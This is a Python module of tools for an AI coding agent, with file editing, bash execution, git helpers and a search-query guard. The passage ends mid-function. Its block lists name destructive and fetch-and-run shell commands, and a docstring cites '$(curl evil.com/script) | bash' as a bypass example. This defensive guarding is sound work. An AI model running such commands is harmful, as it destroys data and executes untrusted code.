from __future__ import annotations

import os
import re
import shutil
import subprocess
from datetime import datetime
from pathlib import Path
from typing import Optional

from .config import AgentConfig


class CheckpointManager:
    """Lightweight file checkpoint manager inspired by Hermes checkpointing."""

    def __init__(self, repo_root: Path, workspace_dir: Path, max_snapshots: int = 100):
        self.repo_root = repo_root.resolve()
        if workspace_dir.is_absolute():
            base_dir = workspace_dir
        else:
            base_dir = self.repo_root / workspace_dir
        self.checkpoints_dir = (base_dir / "checkpoints").resolve()
        self.max_snapshots = max_snapshots

    def snapshot_file(self, file_path: Path) -> Optional[Path]:
        """Create a timestamped snapshot of a file before mutation."""
        if not file_path.exists() or not file_path.is_file():
            return None

        timestamp = datetime.now().strftime("%Y%m%d-%H%M%S-%f")
        try:
            rel_path = file_path.resolve().relative_to(self.repo_root)
        except ValueError:
            # Fallback for paths outside repo root
            rel_path = Path(file_path.name)

        checkpoint_path = self.checkpoints_dir / timestamp / rel_path
        checkpoint_path.parent.mkdir(parents=True, exist_ok=True)
        shutil.copy2(file_path, checkpoint_path)
        self._prune()
        return checkpoint_path

    def _prune(self) -> None:
        """Keep checkpoint count bounded by deleting oldest snapshots."""
        if not self.checkpoints_dir.exists():
            return

        snapshots = sorted(
            [p for p in self.checkpoints_dir.iterdir() if p.is_dir()],
            key=lambda p: p.name
        )
        excess = len(snapshots) - self.max_snapshots
        if excess <= 0:
            return

        for old_snapshot in snapshots[:excess]:
            shutil.rmtree(old_snapshot, ignore_errors=True)


class FileReadTool:
    """Read file contents with line numbers and optional range selection."""
    name = "file_read"
    description = "Read contents of a file (supports optional start_line/end_line to read specific sections)"

    # Only truncate truly enormous files (generated code, minified bundles, etc.)
    HARD_MAX_LINES = 800

    schema = {
        "name": "file_read",
        "description": "Read the contents of a file. For large files, use start_line/end_line to read specific sections.",
        "parameters": {
            "type": "object",
            "properties": {
                "path": {
                    "type": "string",
                    "description": "Path to the file to read"
                },
                "start_line": {
                    "type": "integer",
                    "description": "First line to read (1-based). Omit to start from beginning."
                },
                "end_line": {
                    "type": "integer",
                    "description": "Last line to read (1-based, inclusive). Omit to read to end."
                }
            },
            "required": ["path"]
        }
    }
    
    def __init__(self, cwd: Path = None):
        self.cwd = cwd or Path(".")
    
    def execute(self, path: str, start_line: str = None, end_line: str = None) -> str:
        try:
            file_path = Path(path)
            if not file_path.is_absolute():
                file_path = self.cwd / file_path
            if not file_path.exists():
                return f"Error: File '{path}' not found. Use list_files to explore the directory structure first. The cwd is: {self.cwd}"
            
            content = file_path.read_text(encoding="utf-8")
            lines = content.splitlines()
            total_lines = len(lines)
            
            sl = int(start_line) if start_line else None
            el = int(end_line) if end_line else None
            
            # Line-range request — always return exactly what was asked for
            if sl or el:
                s = max((sl or 1) - 1, 0)
                e = min(el or total_lines, total_lines)
                selected = lines[s:e]
                numbered = [f"{s + i + 1}| {l}" for i, l in enumerate(selected)]
                return f"[{path} lines {s+1}-{e} of {total_lines}]\n" + "\n".join(numbered)
            
            # Full-file read — return complete content for normal-sized files
            if total_lines <= self.HARD_MAX_LINES:
                numbered = [f"{i + 1}| {l}" for i, l in enumerate(lines)]
                return f"[{path} — {total_lines} lines]\n" + "\n".join(numbered)
            
            # Truly huge files: show generous head + tail with clear guidance
            head_n = 300
            tail_n = 100
            head = lines[:head_n]
            tail = lines[-tail_n:]
            omitted = total_lines - head_n - tail_n
            
            head_numbered = [f"{i + 1}| {l}" for i, l in enumerate(head)]
            tail_start = total_lines - tail_n
            tail_numbered = [f"{tail_start + i + 1}| {l}" for i, l in enumerate(tail)]
            
            return (
                f"[{path} — {total_lines} lines, showing lines 1-{head_n} and {tail_start+1}-{total_lines}]\n"
                + "\n".join(head_numbered)
                + f"\n\n... ({omitted} lines omitted — use start_line/end_line to read lines {head_n+1}-{tail_start}) ...\n\n"
                + "\n".join(tail_numbered)
            )
        except Exception as e:
            return f"Error reading file: {e}"


class FileWriteTool:
    """Write content to a file."""
    name = "file_write"
    description = "Write content to a file"
    
    # JSON Schema for tool definition
    schema = {
        "name": "file_write",
        "description": "Write content to a file, creating it if it doesn't exist or overwriting if it does",
        "parameters": {
            "type": "object",
            "properties": {
                "path": {
                    "type": "string",
                    "description": "Path to the file to write"
                },
                "content": {
                    "type": "string",
                    "description": "Content to write to the file"
                }
            },
            "required": ["path", "content"]
        }
    }
    
    def __init__(self, cwd: Path = None, checkpoint_manager: Optional[CheckpointManager] = None):
        self.cwd = cwd or Path(".")
        self.checkpoint_manager = checkpoint_manager
    
    def execute(self, path: str, content: str) -> str:
        try:
            file_path = Path(path)
            if not file_path.is_absolute():
                file_path = self.cwd / file_path

            checkpoint_path = None
            if self.checkpoint_manager and file_path.exists():
                checkpoint_path = self.checkpoint_manager.snapshot_file(file_path)

            file_path.parent.mkdir(parents=True, exist_ok=True)
            file_path.write_text(content, encoding="utf-8")

            if checkpoint_path:
                return f"Successfully wrote to {path} (checkpoint: {checkpoint_path})"
            return f"Successfully wrote to {path}"
        except Exception as e:
            return f"Error writing file: {e}"


class BashTool:
    """Execute bash commands."""
    name = "bash"
    description = "Execute bash commands in the repository"
    
    # JSON Schema for tool definition
    schema = {
        "name": "bash",
        "description": "Execute a bash command in the repository directory",
        "parameters": {
            "type": "object",
            "properties": {
                "command": {
                    "type": "string",
                    "description": "The bash command to execute"
                }
            },
            "required": ["command"]
        }
    }
    
    DANGEROUS_PATTERNS = [
        r'^\s*sudo\s+apt\s+install',
        r'^\s*sudo\s+apt\s+upgrade',
        r'^\s*sudo\s+apt\s+dist-upgrade',
        r'^\s*sudo\s+yum\s+install',
        r'^\s*sudo\s+yum\s+update',
        r'^\s*sudo\s+dnf\s+install',
        r'^\s*sudo\s+dnf\s+update',
        r'^\s*sudo\s+pacman\s+-S',
        r'^\s*sudo\s+apk\s+add',
        r'^\s*brew\s+install\s+python',
        r'^\s*brew\s+upgrade\s+python',
        r'^\s*pip\s+install\s+--upgrade\s+python',
        r'^\s*python\s+-m\s+pip\s+install\s+--upgrade',
        r'^\s*nvm\s+install',
        r'^\s*source\s+nvm',
        r'^\s*curl.*\|.*bash',
        r'^\s*wget.*\|.*bash',
        r'^\s*rm\s+-rf\s+/',
        r'^\s*rm\s+-rf\s+/usr',
        r'^\s*rm\s+-rf\s+/bin',
        r'^\s*dd\s+if=',
        r'^\s*>:',
        r'^\s*>\s*/dev/',
    ]
    
    # Package install commands — the agent should NEVER install new packages.
    # Project deps (npm install with no args, pip install -r) are allowed.
    _PACKAGE_INSTALL_PATTERNS = [
        r'npm\s+install\s+(?!--)(?!\.)(?!\s*$)',         # "npm install <pkg>" but NOT "npm install" (bare) or "npm install --save-dev"
        r'npm\s+install\s+--save[\w-]*\s+',              # "npm install --save-dev <pkg>"
        r'npm\s+i\s+(?!--)(?!\.)(?!\s*$)',                # "npm i <pkg>"
        r'yarn\s+add\s+',                                 # "yarn add <pkg>"
        r'pnpm\s+add\s+',                                 # "pnpm add <pkg>"
        r'pip\s+install\s+(?!-r\s)(?!-e\s)(?!\.\s*$)',    # "pip install <pkg>" but NOT "pip install -r" or "pip install -e ." or "pip install ."
        r'pip3\s+install\s+(?!-r\s)(?!-e\s)(?!\.\s*$)',
        r'gem\s+install\s+',
        r'cargo\s+install\s+',
        r'go\s+install\s+',
    ]
    
    DANGEROUS_KEYWORDS = [
        'chmod 777',
        'chown',
        'systemctl restart',
        'systemctl stop',
        'service restart',
        'kill -9',
        'killall',
        'reboot',
        'shutdown',
        'init 0',
        'init 6',
    ]
    
    def __init__(self, cwd: Path):
        self.cwd = cwd
    
    # Regex to strip ANSI escape codes from output
    _ANSI_RE = re.compile(r'\x1b\[[0-9;]*[a-zA-Z]')

    def _strip_shell_pipes(self, command: str) -> str:
        """Remove trailing shell pipe commands like | head -100, | tail -50, | cat.
        
        These are unreliable on Windows (cmd.exe + Git Bash mix) and cause
        empty output. We handle truncation in Python instead.
        Also strips shell chaining (;, &&) and redirects that cause issues on
        Windows cmd.exe, as well as PowerShell-specific syntax.
        """
        import sys

        # Strip trailing pipes to head/tail/cat/grep (common truncation patterns)
        # Be careful not to strip meaningful pipes (e.g., command1 | command2)
        cleaned = re.sub(
            r'\s*\|\s*(head|tail|cat)(\s+-[0-9n]+)?\s*$',
            '',
            command,
        )
        # Also strip "2>&1" — we capture both streams in Python
        cleaned = re.sub(r'\s*2>&1\s*', ' ', cleaned).strip()

        if sys.platform == "win32":
            # Strip shell chaining after the main command:
            # "npm test -- foo; echo $?" → "npm test -- foo"
            # "npm test -- foo > out.txt; echo done" → "npm test -- foo"
            cleaned = re.sub(r'\s*;\s*.*$', '', cleaned).strip()

            # Strip file redirects: "> file.txt", ">> file.txt"
            cleaned = re.sub(r'\s*>>?\s*\S+\s*$', '', cleaned).strip()

            # Strip PowerShell pipes: "| Select-Object ..."
            cleaned = re.sub(
                r'\s*\|\s*Select-Object.*$', '', cleaned, flags=re.IGNORECASE
            ).strip()

            # Strip bash-style env prefix: "CI=true node ..." → "node ..."
            # (already set via env dict in execute())
            cleaned = re.sub(
                r'^(\w+=\S+\s+)+', '', cleaned
            ).strip()

            # Convert ./node_modules/.bin/X → npx X (dot-slash doesn't work on cmd.exe)
            cleaned = re.sub(
                r'^\./node_modules/\.bin/', 'npx ', cleaned
            ).strip()

            # Convert node node_modules/jest/bin/jest.js → npm test
            jest_node_match = re.match(
                r'^node\s+node_modules[/\\]jest[/\\]bin[/\\]jest\.js\s*(.*)',
                cleaned, re.IGNORECASE
            )
            if jest_node_match:
                jest_args = jest_node_match.group(1).strip()
                cleaned = f"npm test -- {jest_args}" if jest_args else "npm test"

            # Convert npx jest → npm test (npx jest produces no output on Windows)
            # This runs AFTER ./node_modules conversion so both paths are covered
            npx_jest_match = re.match(
                r'^npx\s+jest\s*(.*)', cleaned, re.IGNORECASE
            )
            if npx_jest_match:
                jest_args = npx_jest_match.group(1).strip()
                cleaned = f"npm test -- {jest_args}" if jest_args else "npm test"

        return cleaned

    def execute(self, command: str) -> str:
        # Second layer of defense: check command for dangerous patterns
        is_safe, reason = self._check_dangerous_command(command)
        if not is_safe:
            return f"Error: Command blocked by safety guard - {reason}\n\nThis command attempts to modify system components. The agent is not allowed to:\n- Install or upgrade system packages\n- Install new project dependencies\n- Modify system-wide Python/Java/Node\n- Execute potentially destructive commands\n\nIf you need to install project dependencies, use:\n- pip install -r requirements.txt\n- npm install (bare, no package names)\n- Just regular commands without sudo/brew upgrade"
        
        # Use a longer timeout for test/build commands
        timeout = 60
        cmd_lower = command.lower()
        if any(kw in cmd_lower for kw in ['test', 'jest', 'vitest', 'pytest', 'build', 'compile', 'tsc']):
            timeout = 180  # 3 minutes for test/build commands

        # Strip unreliable shell pipes — handle truncation in Python
        clean_command = self._strip_shell_pipes(command)

        # Run in CI-like mode:
        # - CI=true: makes Jest, CRA, npm, etc. non-interactive
        # - stdin=DEVNULL: closes stdin so interactive prompts get EOF
        # - FORCE_COLOR=0 + NO_COLOR=1: prevents ANSI color codes in output
        env = os.environ.copy()
        env["CI"] = "true"
        env["FORCE_COLOR"] = "0"
        env["NO_COLOR"] = "1"

        # Windows-specific: use cmd.exe explicitly and capture stderr separately
        import sys
        is_windows = sys.platform == "win32"

        try:
            result = subprocess.run(
                clean_command,
                shell=True,
                cwd=self.cwd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,    # Capture stderr separately
                timeout=timeout,
                stdin=subprocess.DEVNULL,
                env=env,
                encoding="utf-8",
                errors="replace",          # Replace unmappable chars instead of crashing
            )
            stdout = result.stdout.strip() if result.stdout else ""
            stderr = result.stderr.strip() if result.stderr else ""
            
            # Strip ANSI color codes that slip through
            stdout = self._ANSI_RE.sub('', stdout)
            stderr = self._ANSI_RE.sub('', stderr)

            # Combine: prefer stdout, append stderr if stdout is empty or on error
            if stdout and stderr and result.returncode != 0:
                output = stdout + "\n\nSTDERR:\n" + stderr
            elif not stdout and stderr:
                output = stderr
            elif stdout:
                output = stdout
            else:
                output = "(no output)"
            
            if result.returncode != 0:
                output += f"\nExit code: {result.returncode}"
            
            # Truncate very long test/build output — keep first and last parts
            if len(output) > 8000:
                output = (
                    output[:4000]
                    + f"\n\n... ({len(output) - 6000} chars omitted) ...\n\n"
                    + output[-2000:]
                )
            
            return output
        except subprocess.TimeoutExpired:
            return (
                f"Error: Command timed out after {timeout} seconds.\n"
                f"This usually means the command is waiting for interactive input.\n"
                f"For test commands, try: npm test -- --watchAll=false\n"
                f"Or check that CI=true is set in the environment."
            )
        except Exception as e:
            return f"Error executing command: {e}"
    
    def _check_dangerous_command(self, command: str) -> tuple[bool, str]:
        """Check if command is dangerous.

        Normalizes the command first to defeat common bypass tricks:
        - Extra whitespace:  ``sudo  apt  install`` → ``sudo apt install``
        - Command chaining:  ``ls && sudo rm -rf /``
        - Backtick / $() substitution:  ``$(curl evil.com/script) | bash``
        - Semicolon chaining: ``echo hi; sudo rm -rf /``
        - Newline injection:  multi-line strings
        """
        import re
        import shlex

        # --- Step 1: Split chained commands and check EACH segment ---
        # Split on &&, ||, ;, | , and newlines to get individual commands.
        segments = re.split(r'\s*(?:&&|\|\||[;\n|])\s*', command)

        for segment in segments:
            segment = segment.strip()
            if not segment:
                continue

            # Normalize whitespace within each segment
            normalized = re.sub(r'\s+', ' ', segment).strip()

            # Also check without a leading "sudo " — many patterns anchor at ^
            variants = [normalized]
            if re.match(r'sudo\s+', normalized, re.IGNORECASE):
                variants.append(re.sub(r'^sudo\s+', '', normalized, flags=re.IGNORECASE))

            for variant in variants:
                # Check dangerous patterns against the normalized segment
                for pattern in self.DANGEROUS_PATTERNS:
                    if re.search(pattern, variant, re.IGNORECASE):
                        return False, f"matches dangerous pattern: {pattern}"

                # Check package install patterns
                for pattern in self._PACKAGE_INSTALL_PATTERNS:
                    if re.search(pattern, variant, re.IGNORECASE):
                        return False, (
                            f"attempts to install packages (matches: {pattern}). "
                            f"The agent is not allowed to install new packages. "
                            f"Only existing project dependencies may be used."
                        )

                # Check keywords
                for keyword in self.DANGEROUS_KEYWORDS:
                    if keyword.lower() in variant.lower():
                        return False, f"contains dangerous keyword: {keyword}"

        # --- Step 2: Check the FULL command for shell injection patterns ---
        # These patterns are dangerous regardless of which segment they're in.
        _INJECTION_PATTERNS = [
            r'`[^`]+`',                    # backtick command substitution
            r'\$\([^)]+\)',                # $() command substitution
            r'\$\{[^}]+\}',               # ${} variable expansion (complex forms)
            r'>\s*/etc/',                  # writing to /etc
            r'>\s*/var/',                  # writing to /var
            r'>\s*~/',                     # writing to home directory root
            r'eval\s+',                    # eval command
            r'exec\s+',                    # exec command
            r'source\s+(?!\.env)',         # source (except .env)
            r'\bsh\s+-c\s+',              # sh -c (sub-shell execution)
            r'\bbash\s+-c\s+',            # bash -c
            r'\bpowershell\s+-c',         # powershell -Command
            r'\bcmd\s+/c\s+',             # cmd /c
        ]

        for pattern in _INJECTION_PATTERNS:
            if re.search(pattern, command, re.IGNORECASE):
                return False, f"contains shell injection pattern: {pattern}"

        return True, ""


class ListFilesTool:
    """List files in a directory."""
    name = "list_files"
    description = "List files in a directory"
    
    # JSON Schema for tool definition
    schema = {
        "name": "list_files",
        "description": "List files in a directory matching a glob pattern",
        "parameters": {
            "type": "object",
            "properties": {
                "path": {
                    "type": "string",
                    "description": "Directory path to list (default: current directory)"
                },
                "pattern": {
                    "type": "string", 
                    "description": "Glob pattern to match files (default: * for all files)"
                }
            }
        }
    }
    
    def __init__(self, cwd: Path = None):
        self.cwd = cwd or Path(".")
    
    def execute(self, path: str = ".", pattern: str = "*") -> str:
        try:
            dir_path = Path(path)
            if not dir_path.is_absolute():
                dir_path = self.cwd / dir_path
            if not dir_path.exists():
                return f"Error: Directory '{path}' not found. Available directories in {self.cwd}:\n" + "\n".join([str(f.relative_to(self.cwd)) for f in self.cwd.iterdir()])[:500]
            files = list(dir_path.glob(pattern))
            return "\n".join([str(f.relative_to(dir_path)) for f in files])
        except Exception as e:
            return f"Error listing files: {e}"


class GrepTool:
    """Search for text patterns in files."""
    name = "grep"
    description = "Search for text patterns in files using regex"
    
    # JSON Schema for tool definition
    schema = {
        "name": "grep",
        "description": "Search for text patterns in files using regular expressions. Similar to the ripgrep (rg) command.",
        "parameters": {
            "type": "object",
            "properties": {
                "pattern": {
                    "type": "string",
                    "description": "Regular expression pattern to search for"
                },
                "path": {
                    "type": "string",
                    "description": "File or directory path to search in (default: current directory)"
                },
                "include": {
                    "type": "string",
                    "description": "Glob pattern for files to include (e.g., '*.js', '*.py')"
                }
            },
            "required": ["pattern"]
        }
    }
    
    def __init__(self, cwd: Path = None):
        self.cwd = cwd or Path(".")
    
    def execute(self, pattern: str, path: str = ".", include: str = None) -> str:
        import re
        try:
            search_path = Path(path)
            if not search_path.is_absolute():
                search_path = self.cwd / search_path
            
            if not search_path.exists():
                return f"Error: Path '{path}' not found"
            
            results = []
            
            # Determine which files to search
            if search_path.is_file():
                files_to_search = [search_path]
            else:
                files_to_search = []
                if include:
                    files_to_search = list(search_path.glob(include))
                else:
                    # Search all text files
                    for ext in ['.py', '.js', '.ts', '.jsx', '.tsx', '.java', '.go', '.rs', '.cpp', '.c', '.h', '.rb', '.php', '.json', '.yaml', '.yml', '.md', '.txt']:
                        files_to_search.extend(search_path.rglob(f'*{ext}'))
            
            # Compile regex
            try:
                regex = re.compile(pattern)
            except re.error as e:
                return f"Error: Invalid regex pattern: {e}"
            
            # Search files
            for file_path in files_to_search[:100]:  # Limit to 100 files
                try:
                    content = file_path.read_text(encoding='utf-8', errors='ignore')
                    for line_num, line in enumerate(content.split('\n'), 1):
                        if regex.search(line):
                            results.append(f"{file_path.relative_to(self.cwd)}:{line_num}: {line.rstrip()}")
                except Exception:
                    continue
            
            if not results:
                return f"No matches found for pattern: {pattern}"
            
            return "\n".join(results[:50])  # Limit results
        
        except Exception as e:
            return f"Error searching: {e}"


class FileTreeTool:
    """Return a recursive directory tree (like the `tree` command)."""
    name = "file_tree"
    description = "Show the full project directory tree (2-3 levels deep). Call once at the start to understand project structure."

    schema = {
        "name": "file_tree",
        "description": "Return a recursive directory tree of the project. Use this ONCE at the start instead of repeated list_files calls.",
        "parameters": {
            "type": "object",
            "properties": {
                "path": {
                    "type": "string",
                    "description": "Root path to tree (default: current directory)"
                },
                "max_depth": {
                    "type": "integer",
                    "description": "Maximum depth to recurse (default: 3)"
                }
            }
        }
    }

    # Directories to always skip
    SKIP_DIRS = {
        'node_modules', '.git', '__pycache__', '.tox', '.mypy_cache',
        '.pytest_cache', 'dist', 'build', '.next', '.nuxt', 'venv',
        '.venv', 'env', '.env', '.eggs', '*.egg-info', 'coverage',
        '.coverage', 'htmlcov', '.idea', '.vscode', 'target',
    }

    def __init__(self, cwd: Path = None):
        self.cwd = cwd or Path(".")

    def execute(self, path: str = ".", max_depth: str = "3") -> str:
        try:
            root = Path(path)
            if not root.is_absolute():
                root = self.cwd / root
            if not root.exists():
                return f"Error: Directory '{path}' not found"

            depth_limit = int(max_depth)
            lines = [f"{root.name}/"]
            self._walk(root, "", depth_limit, 0, lines)

            if len(lines) > 300:
                lines = lines[:300]
                lines.append(f"... (tree truncated at 300 entries)")

            return "\n".join(lines)
        except Exception as e:
            return f"Error generating file tree: {e}"

    def _walk(self, directory: Path, prefix: str, max_depth: int, current_depth: int, lines: list):
        if current_depth >= max_depth:
            return

        try:
            entries = sorted(directory.iterdir(), key=lambda p: (not p.is_dir(), p.name.lower()))
        except PermissionError:
            return

        # Filter out skipped directories and hidden files
        entries = [
            e for e in entries
            if not e.name.startswith('.') or e.name in ('.env.example', '.gitignore')
            if e.name not in self.SKIP_DIRS
        ]

        for i, entry in enumerate(entries):
            is_last = (i == len(entries) - 1)
            connector = "└── " if is_last else "├── "
            child_prefix = prefix + ("    " if is_last else "│   ")

            if entry.is_dir():
                lines.append(f"{prefix}{connector}{entry.name}/")
                self._walk(entry, child_prefix, max_depth, current_depth + 1, lines)
            else:
                lines.append(f"{prefix}{connector}{entry.name}")


class FileEditTool:
    """Edit a file by replacing a specific text block (str_replace style)."""
    name = "file_edit"
    description = "Edit a file by replacing an exact text block with new text. Safer than file_write for modifying existing files."

    schema = {
        "name": "file_edit",
        "description": "Replace a specific block of text in a file. The old_content must match EXACTLY (including whitespace/indentation). Use this instead of file_write when modifying existing files.",
        "parameters": {
            "type": "object",
            "properties": {
                "path": {
                    "type": "string",
                    "description": "Path to the file to edit"
                },
                "old_content": {
                    "type": "string",
                    "description": "The exact text to find and replace (must match exactly, including whitespace)"
                },
                "new_content": {
                    "type": "string",
                    "description": "The replacement text"
                }
            },
            "required": ["path", "old_content", "new_content"]
        }
    }

    def __init__(self, cwd: Path = None, checkpoint_manager: Optional[CheckpointManager] = None):
        self.cwd = cwd or Path(".")
        self.checkpoint_manager = checkpoint_manager

    def execute(self, path: str, old_content: str, new_content: str) -> str:
        try:
            file_path = Path(path)
            if not file_path.is_absolute():
                file_path = self.cwd / file_path

            if not file_path.exists():
                return f"Error: File '{path}' not found. Use file_tree or list_files to find the correct path."

            content = file_path.read_text(encoding="utf-8")

            # Count exact occurrences
            count = content.count(old_content)

            if count == 0:
                # --- Whitespace-tolerant retry ---
                # Try matching with normalized leading whitespace
                match_result = self._fuzzy_whitespace_match(content, old_content)
                if match_result:
                    actual_old, match_count = match_result
                    if match_count == 1:
                        # Found a unique match with different indentation
                        # Apply the edit using the actual text found in the file
                        new_adjusted = self._adjust_indentation(actual_old, old_content, new_content)

                        if self.checkpoint_manager:
                            self.checkpoint_manager.snapshot_file(file_path)

                        new_file_content = content.replace(actual_old, new_adjusted, 1)
                        file_path.write_text(new_file_content, encoding="utf-8")

                        old_lines = len(old_content.strip().split('\n'))
                        new_lines = len(new_content.strip().split('\n'))
                        return (
                            f"Successfully edited {path}: replaced {old_lines} lines with {new_lines} lines. "
                            f"(Note: auto-corrected whitespace mismatch)"
                        )
                    elif match_count > 1:
                        return (
                            f"Error: old_content matches {match_count} locations in '{path}' after whitespace normalization. "
                            f"Include more surrounding context to make the match unique."
                        )

                # No match even with fuzzy whitespace — give a hint
                first_line = old_content.strip().split('\n')[0].strip()
                hint = ""
                if first_line:
                    for i, line in enumerate(content.split('\n'), 1):
                        if first_line in line:
                            hint = f"\nHint: Line {i} contains '{first_line[:60]}' — re-read the file around that line to get the exact text."
                            break
                return (
                    f"Error: old_content not found in '{path}'. "
                    f"The text must match EXACTLY, including whitespace and indentation.{hint}"
                )

            if count > 1:
                return (
                    f"Error: old_content matches {count} locations in '{path}'. "
                    f"Include more surrounding context to make the match unique."
                )

            # Exact match found — apply edit
            if self.checkpoint_manager:
                self.checkpoint_manager.snapshot_file(file_path)

            new_file_content = content.replace(old_content, new_content, 1)
            file_path.write_text(new_file_content, encoding="utf-8")

            old_lines = len(old_content.strip().split('\n'))
            new_lines = len(new_content.strip().split('\n'))
            return (
                f"Successfully edited {path}: replaced {old_lines} lines with {new_lines} lines."
            )
        except Exception as e:
            return f"Error editing file: {e}"

    @staticmethod
    def _normalize_lines(text: str) -> str:
        """Strip leading whitespace from each line for fuzzy comparison."""
        return '\n'.join(line.lstrip() for line in text.split('\n'))

    @classmethod
    def _fuzzy_whitespace_match(cls, file_content: str, old_content: str):
        """Try to find old_content in file_content ignoring leading whitespace.

        Returns (actual_text_found, match_count) or None if no match.
        """
        old_normalized = cls._normalize_lines(old_content)
        old_line_count = len(old_content.split('\n'))
        file_lines = file_content.split('\n')

        matches = []
        for start_idx in range(len(file_lines) - old_line_count + 1):
            window = file_lines[start_idx:start_idx + old_line_count]
            window_normalized = '\n'.join(line.lstrip() for line in window)
            if window_normalized == old_normalized:
                actual_text = '\n'.join(window)
                matches.append(actual_text)

        if matches:
            return matches[0], len(matches)
        return None

    @staticmethod
    def _adjust_indentation(actual_old: str, requested_old: str, new_content: str) -> str:
        """Adjust new_content indentation to match what's actually in the file.

        If the model sent old_content with 2-space indent but the file uses 4-space,
        shift new_content by the same delta.
        """
        actual_lines = actual_old.split('\n')
        requested_lines = requested_old.split('\n')

        # Find the indentation delta from the first non-empty line
        delta = 0
        for a_line, r_line in zip(actual_lines, requested_lines):
            a_indent = len(a_line) - len(a_line.lstrip())
            r_indent = len(r_line) - len(r_line.lstrip())
            if a_line.strip() and r_line.strip():
                delta = a_indent - r_indent
                break

        if delta == 0:
            return new_content

        # Apply the delta to every line of new_content
        adjusted_lines = []
        for line in new_content.split('\n'):
            if not line.strip():
                adjusted_lines.append(line)
            elif delta > 0:
                adjusted_lines.append(' ' * delta + line)
            else:
                # Remove leading spaces (but don't go negative)
                strip_amount = min(abs(delta), len(line) - len(line.lstrip()))
                adjusted_lines.append(line[strip_amount:])

        return '\n'.join(adjusted_lines)


class RevertFileTool:
    """Revert a file to its state at the current branch's base commit."""
    name = "revert_file"
    description = "Revert a file to its original state (undo all changes made by the agent)"

    schema = {
        "name": "revert_file",
        "description": "Revert a file to its original state from the base branch. Use this when a file_write or file_edit corrupted a file.",
        "parameters": {
            "type": "object",
            "properties": {
                "path": {
                    "type": "string",
                    "description": "Path to the file to revert"
                }
            },
            "required": ["path"]
        }
    }

    def __init__(self, repo, cwd: Path = None):
        self.repo = repo
        self.cwd = cwd or Path(".")

    def execute(self, path: str) -> str:
        try:
            self.repo.git.checkout("--", path)
            return f"Successfully reverted '{path}' to its original state."
        except Exception as e:
            # If git checkout fails, the file might be untracked (new file).
            # In that case, delete it to "revert" to the state where it didn't exist.
            try:
                file_path = Path(path)
                if not file_path.is_absolute():
                    file_path = self.cwd / file_path
                if file_path.exists():
                    file_path.unlink()
                    return f"Deleted untracked file '{path}' (was not in git)."
            except Exception as del_err:
                return f"Error reverting file: {e} (also failed to delete: {del_err})"
            return f"Error reverting file: {e}"


class GitDiffTool:
    """Show git diff for a specific file or the whole repo."""
    name = "git_diff"
    description = "Show the git diff of changes made so far (optionally for a specific file)"

    schema = {
        "name": "git_diff",
        "description": "Show git diff of uncommitted changes. Use to review your work before calling done().",
        "parameters": {
            "type": "object",
            "properties": {
                "path": {
                    "type": "string",
                    "description": "Optional: specific file path to diff. Omit for all changes."
                }
            }
        }
    }

    def __init__(self, repo):
        self.repo = repo

    def execute(self, path: str = "") -> str:
        try:
            if path:
                diff = self.repo.git.diff("--", path)
            else:
                diff = self.repo.git.diff()

            if not diff:
                # Also check for new untracked files
                untracked = self.repo.untracked_files
                if untracked:
                    return f"No diff for tracked files. New untracked files:\n" + "\n".join(f"  + {f}" for f in untracked)
                return "No changes detected."

            # Truncate very large diffs
            if len(diff) > 8000:
                diff = diff[:8000] + f"\n... (diff truncated, {len(diff) - 8000} chars omitted)"
            return diff
        except Exception as e:
            return f"Error getting diff: {e}"


class GitStatusTool:
    """Check git status."""
    name = "git_status"
    description = "Check current git status"
    
    # JSON Schema for tool definition
    schema = {
        "name": "git_status",
        "description": "Check the current git status of the repository",
        "parameters": {
            "type": "object",
            "properties": {}
        }
    }
    
    def __init__(self, repo):
        self.repo = repo
    
    def execute(self) -> str:
        try:
            return self.repo.git.status()
        except Exception as e:
            return f"Error checking git status: {e}"


class DoneTool:
    """Signal that the task is complete."""
    name = "done"
    description = "Signal that all work is done. Call this when you have completed the task."
    
    # JSON Schema for tool definition
    schema = {
        "name": "done",
        "description": "Signal that the task is complete. Call this when all work has been finished.",
        "parameters": {
            "type": "object",
            "properties": {
                "message": {
                    "type": "string",
                    "description": "Optional message describing what was completed"
                }
            }
        }
    }
    
    def execute(self, message: str = "") -> str:
        return f"DONE: {message if message else 'Task completed successfully'}"


class SearchGuard:
    """Validates web search queries to block code dumps and IP leakage.

    The goal is twofold:
    1. Prevent the agent from pasting code into a search engine.
    2. Prevent proprietary information (internal URLs, file contents,
       variable names from the codebase, API keys, etc.) from leaking
       to external search providers.

    Natural-language questions about concepts, libraries, and patterns
    are always allowed.
    """

    # Maximum query length — anything longer is almost certainly a code dump
    MAX_QUERY_LENGTH = 300

    # Only block queries that look like actual code, not natural-language questions
    CODE_PATTERNS = [
        r'def\s+\w+\s*\(',        # function definitions with parens
        r'class\s+\w+\s*[:\(]',    # class definitions
        r'from\s+\w+\s+import',    # from imports
        r'const\s+\w+\s*=',       # JS const assignments
        r'let\s+\w+\s*=',         # JS let assignments
        r'var\s+\w+\s*=',         # JS var assignments
        r'#include\s*[<"]',        # C/C++ includes
        r'pub\s+fn\s+\w+',        # Rust functions
        r'select\s+\*?\s+from',   # SQL SELECT
        r'insert\s+into',         # SQL INSERT
        r'create\s+table',        # SQL CREATE
    ]

    # Only block if query is mostly code (has assignment + braces/parens)
    CODE_SYNTAX_PATTERNS = [
        r'\{[\s\S]{20,}\}',       # large object/block literals (20+ chars)
        r'\[[\s\S]{20,}\]',       # large array literals
        r';\s*\n',                 # semicolons with newlines (multi-line code)
    ]

    # Patterns that indicate proprietary/internal information
    IP_LEAK_PATTERNS = [
        r'https?://[^/]*\.(internal|corp|local|intranet)\b',  # internal URLs
        r'https?://git\.\w+\.\w+/',     # self-hosted git instances
        r'https?://jira\.\w+\.\w+/',    # self-hosted jira
        r'https?://confluence\.\w+\.\w+/',  # self-hosted confluence
        r'https?://10\.\d+\.\d+\.\d+',  # private IPs
        r'https?://172\.(1[6-9]|2\d|3[01])\.\d+\.\d+',  # private IPs
        r'https?://192\.168\.\d+\.\d+', # private IPs
        r'api[_-]?key\s*[=:]\s*\S+',    # API keys
        r'token\s*[=:]\s*["\']?\w{20,}', # tokens
        r'password\s*[=:]\s*\S+',        # passwords
        r'secret\s*[=:]\s*\S+',          # secrets
    ]

    @classmethod
    def is_safe_query(cls, query: str) -> tuple[bool, str]:
        """
        Validate if a search query is safe (general question, not code dump or IP leak).
        Returns (is_safe, reason_if_unsafe)
        """
        if not query or not query.strip():
            return False, "Query is empty"

        # Length check — long queries are almost always code/file content
